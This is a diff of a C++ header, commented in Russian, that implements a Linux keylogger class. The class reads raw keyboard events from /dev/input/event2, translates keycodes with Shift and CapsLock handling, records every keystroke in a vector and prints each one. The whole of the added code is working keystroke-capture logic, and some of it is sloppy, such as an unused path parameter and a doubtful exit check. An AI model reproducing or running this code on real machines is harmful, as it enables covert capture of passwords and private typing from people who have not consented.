@@ -1,5 +1,27 @@
-#include <string>
+#pragma once
+#define DEV_PATH "/dev/input/event2"
 #include <map>
+
+#pragma region Вспомогательные функции
+int check(int result) {
+    if (result >= 0)
+        return result;
+
+
+    perror(strerror(errno));
+    exit(-1);
+}
+
+bool isLetter(const int value)
+{
+    if ((value >= 16 && value <= 25) || (value >= 30 && value <= 38) || (value >= 44 && value <= 50))
+        return true;
+    else
+        return false;
+}
+#pragma endregion
+
+#pragma region Класс кей логгера
 class Key_logger{
     std::map<unsigned short, const char*> keys; 
 public:
@@ -58,7 +80,6 @@ public:
         keys.insert({52,". "});
         keys.insert({53,"/ "});
         keys.insert({54,"RSHIFT "});
-        //keys.insert({55,"*"}); как будто нет такого кода
         keys.insert({56, "LALT "});
         keys.insert({57,"SPACE "});
         keys.insert({58,"CAPSLOCK "});
@@ -73,8 +94,7 @@ public:
         keys.insert({67,"f9 "});
         keys.insert({68,"f10 "});
         keys.insert({69,"NUMLOCK "});
-        keys.insert({70,"SLOCK "}); //???
-        //
+        keys.insert({70,"SCROLLOCK "}); 
         keys.insert({100,"RALT "});
         keys.insert({103,"UP "});
         keys.insert({108,"DOWN "});
@@ -82,6 +102,7 @@ public:
         keys.insert({106,"RIGHT "});
         keys.insert({110,"INS "});
         keys.insert({111,"DEL "});
+        keys.insert({119, "PAUSEBREAK"});
         keys.insert({125,"WIN "});
 
         keys.insert({1001,"ESC"});
@@ -134,11 +155,88 @@ public:
         keys.insert({1051,"< "});
         keys.insert({1052,"> "});
         keys.insert({1053,"? "});
-        keys.insert({1058,"CAPSLOCK1  "});
+        keys.insert({1058,"CAPSLOCK  "});
     }
 
+    //std::vector<const char*>
     const char* get_name_of_the_key(int key){
         return keys[key];
     } 
+    std::vector<const char*> get_keys_vector(const char* path){
+        int keys_fd; //дескриптор
+        struct input_event t;  
+        struct input_event t_shift;
+        keys_fd = check(open(DEV_PATH, O_RDONLY));
+        std::vector<const char*> names;
+        bool flag_shift = false;
+        bool flag_caps = false;
+        while (true)
+        {
+
+            if (read(keys_fd, &t, sizeof(t)) == sizeof(t))
+            {
+                if (t.type == EV_KEY)
+
+                    if (t.value == 0 || t.value == 1)
+                    {
+                        if (t.code == 42 && t.value == 1)
+                            flag_shift = true;
+                        if (t.code == 42 && t.value == 0)
+                            flag_shift = false;
+                        if (t.code == 58 && t.value == 1)
+                        {
+                            std::cout << "Changed!" << std::endl;
+                            flag_caps = !flag_caps;
+                        }
+
+                        if (t.value == 1 && isLetter(t.code))
+                        {
+                            if (flag_shift == true && flag_caps == false)
+                            {
+                                names.push_back(keys[t.code + 1000]);
+                                std::cout << "key1 " << keys[t.code + 1000] << std::endl;
+                            }
+                            else if (flag_caps == true && flag_shift == false)
+                            {
+                                names.push_back(keys[t.code + 1000]);
+                                std::cout << "key2 " << keys[t.code + 1000] << std::endl;
+                            }
+                            else
+                            {
+                                names.push_back(keys[t.code]);
+                                std::cout << "key3 " << keys[t.code] << std::endl;
+                            }
+                        }               
+                        else if (t.value == 1 && !isLetter(t.code))
+                        {
+                            if (flag_shift == true)
+                            {
+                                names.push_back(keys[t.code + 1000]);
+                                std::cout << "key4 " << keys[t.code + 1000] << std::endl;
+                                if (t.code == 1)
+                                    t.code += 1000;
+                            }
+                            if (flag_shift == false)
+                            {
+                                names.push_back(keys[t.code]);
+                                std::cout << "key5 " << keys[t.code] << std::endl;
+                            }
+                        }
+                    }
+
+                    if (t.code == 1001){
+                        std::cout << t.code << std::endl;
+                        std::cout << "Exit" << std::endl;
+                        break;
+                    }
+                
+            }
+
+
+        }
+        close(keys_fd);
+        return names;  
+    }
 
 };
+#pragma endregion
